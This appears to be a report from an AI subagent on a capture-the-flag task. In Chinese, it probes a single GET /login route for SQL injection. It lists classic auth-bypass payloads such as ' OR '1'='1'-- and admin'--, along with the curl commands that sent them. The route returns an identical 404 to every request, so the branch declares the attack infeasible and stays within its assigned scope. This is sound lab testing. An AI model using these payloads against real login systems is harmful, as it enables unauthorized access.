## Branch Result
direction: login_sqli
subagent_id: branch_001
status: INFEASIBLE

### 发现
- 严格限定测试 `GET /login` 的 `username`、`password` 参数，未测试其他方法或路径，也未进行密码爆破。
- 无参数、空参数和随机错误凭据的基线响应完全一致：HTTP `404`、`Content-Length: 539`、无 `Location`、正文 SHA-256 为 `46e4eb01fdf3949a5d4e296a998e68d1447e1866a6cb9b2e18dab735dab25bb3`。
- 响应服务器为 `openresty`，页面标题为 `Error 404 - login Not Found!`，未出现应用登录失败信息、SQL 错误、会话 Cookie、认证成功跳转或 flag。
- 在 `username` 和 `password` 分别测试单引号、成对布尔真/假条件、行注释、井号注释和双参数 OR 绕过，共 10 个注入请求。所有响应仍为 HTTP `404`、539 bytes、同一正文哈希，且无跳转。
- 关键真假对照无差异：
  - `username=' OR '1'='1'-- `：`404 / 539 / 46e4eb01fdf3949a...`
  - `username=' OR '1'='2'-- `：`404 / 539 / 46e4eb01fdf3949a...`
  - `password=' OR '1'='1'-- `：`404 / 539 / 46e4eb01fdf3949a...`
  - `password=' OR '1'='2'-- `：`404 / 539 / 46e4eb01fdf3949a...`
- 因此，在限定的 `GET /login` 攻击面上，请求未表现出进入认证/SQL 查询逻辑的迹象，无法确认 SQL 注入或认证绕过。

### 命令和结果
基线：

```bash
curl -sS -i --max-time 12 -G \
  --data-urlencode 'username=branch001_nonexistent' \
  --data-urlencode 'password=branch001_wrong' \
  'http://2273095efcf1270253338a5c.http-ctf2.dasctf.com:80/login'
```

结果摘要：

```text
HTTP/1.1 404 Not Found
Content-Length: 539
Server: openresty
<title>Error 404 - login Not Found!</title>
```

username 布尔真假对照：

```bash
curl -sS -i --max-time 12 -G \
  --data-urlencode "username=' OR '1'='1'-- " \
  --data-urlencode 'password=x' \
  'http://2273095efcf1270253338a5c.http-ctf2.dasctf.com:80/login'

curl -sS -i --max-time 12 -G \
  --data-urlencode "username=' OR '1'='2'-- " \
  --data-urlencode 'password=x' \
  'http://2273095efcf1270253338a5c.http-ctf2.dasctf.com:80/login'
```

两者结果：

```text
HTTP 404, 539 bytes, no redirect
SHA-256 46e4eb01fdf3949a5d4e296a998e68d1447e1866a6cb9b2e18dab735dab25bb3
```

password 布尔真假对照：

```bash
curl -sS -i --max-time 12 -G \
  --data-urlencode 'username=branch001' \
  --data-urlencode "password=' OR '1'='1'-- " \
  'http://2273095efcf1270253338a5c.http-ctf2.dasctf.com:80/login'

curl -sS -i --max-time 12 -G \
  --data-urlencode 'username=branch001' \
  --data-urlencode "password=' OR '1'='2'-- " \
  'http://2273095efcf1270253338a5c.http-ctf2.dasctf.com:80/login'
```

两者结果：

```text
HTTP 404, 539 bytes, no redirect
SHA-256 46e4eb01fdf3949a5d4e296a998e68d1447e1866a6cb9b2e18dab735dab25bb3
```

其他已测试载荷及结果：

```text
username='                     -> 404, 539, same hash
password='                     -> 404, 539, same hash
username=admin'--              -> 404, 539, same hash
username=' OR '1'='1'#         -> 404, 539, same hash
username=' OR 1=1--            -> 404, 539, same hash
两个参数均为 ' OR '1'='1'--   -> 404, 539, same hash
```

### 结论
`INFEASIBLE`（仅针对题目指定的 `GET /login?username=...&password=...` 范围）。该路由对基线和所有 SQL 注入/认证绕过载荷统一返回 openresty 404，缺少任何可利用的状态码、长度、正文、错误、延时或跳转差异。未获得 flag。若后续允许扩大范围，建议先核对登录表单实际提交方法或后端真实路由；本分支不越界验证。
